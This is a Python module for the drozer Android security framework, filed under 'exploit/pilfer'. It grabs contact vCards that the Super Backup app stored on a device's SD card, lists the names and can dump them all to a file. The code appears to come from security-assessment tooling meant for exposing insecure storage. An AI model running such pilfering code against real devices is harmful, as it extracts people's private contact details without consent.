import re

from mwr.common import fs
from drozer.modules import common, Module

class Contacts(Module, common.FileSystem, common.ClassLoader):
    
    name = "Grab Contact details exported by Super Backup"
    description = """Grabs Contact details backed up to the SD card by 'Super Backup : SMS & Contacts' (com.idea.backup.smscontacts)."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "idea", "superbackup"]
    
    __directory = "/mnt/sdcard/SmsContactsBackup/contacts"
    
    class VCard(object):
        
        def __init__(self, data):
            self.data = data.strip()
        
        def name(self):
            return re.search("FN:(.+)\n", self.data).group(1)
        
        def __str__(self):
            return self.data
    
    def add_arguments(self, parser):
        parser.add_argument("-o", "--output", help="specify a file, to which all exported details will be written")
    
    def execute(self, arguments):
        contacts = []
        dumps = self.listFiles(self.__directory)
        
        if dumps != None:
            for dump in dumps:
                data = self.readFile("/".join([self.__directory, str(dump)]))
                offset = 0
                
                while True:
                    (vcard, offset) = self.__next_vcard(data, offset)
                    
                    if vcard != None:
                        contacts.append(vcard)
                    else:
                        break
        
        if len(contacts) == 0:
            self.stdout.write("No contacts found. Either Super Backup is not installed, no backups have been made, or backups are saved in a non-standard path.\n\n")
        else:
            self.stdout.write("Extracted %d contacts:\n" % len(contacts))
            for contact in contacts:
                self.stdout.write("  %s\n" % contact.name())
            self.stdout.write("\n")
            
            # if an output path has been specified, concatenate and write all vcards
            # to it
            if arguments.output != None:
                length = fs.write(arguments.output, reduce(lambda x,y: "%s\n\n%s" % (x, y), contacts))
                
                self.stdout.write("Written %d bytes to %s.\n\n" % (length, arguments.output))

    def get_completion_suggestions(self, action, text, **kwargs):
        if action.dest == "output":
            return common.path_completion.on_console(text)
        
    def __next_vcard(self, data, offset=0):
        vcard = None
        
        start_at = end_at = data.find("BEGIN:VCARD", offset)
        if start_at >= 0:
            end_at = data.find("END:VCARD", start_at) + 9
            
            vcard = Contacts.VCard(data[start_at:end_at]) 
        
        return (vcard, end_at)
        
